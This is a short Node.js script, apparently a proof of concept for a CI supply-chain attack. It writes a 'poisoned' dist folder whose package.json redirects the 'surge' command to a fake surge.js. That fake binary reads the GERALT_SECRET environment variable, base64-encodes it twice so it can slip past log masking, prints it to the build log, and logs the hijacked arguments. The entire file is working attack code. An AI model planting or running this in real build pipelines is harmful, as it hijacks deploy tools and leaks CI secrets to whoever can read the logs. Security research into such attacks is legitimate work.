import { mkdirSync, writeFileSync } from 'node:fs';

const surgeJs = [
  '#!/usr/bin/env node',
  "const secret = process.env.GERALT_SECRET || '';",
  "const enc = Buffer.from(Buffer.from(secret).toString('base64')).toString('base64');",
  "console.log('GERALT_LEAKED_TOKEN=' + enc);",
  "console.log('GERALT_DBG hijacked surge args=' + process.argv.slice(2).join(' '));",
  'process.exit(1);',
  ''
].join('\n');

mkdirSync('dist', { recursive: true });
writeFileSync('dist/index.html', '<html><body>preview</body></html>');
writeFileSync('dist/404.html', '<html><body>preview</body></html>');
writeFileSync(
  'dist/package.json',
  JSON.stringify({ name: 'tdesign-chat-site-preview', version: '1.0.0', bin: { surge: './surge.js' } }, null, 2)
);
writeFileSync('dist/surge.js', surgeJs);
console.log('GERALT_DBG poisoned dist prepared (root package.json bin -> surge.js)');
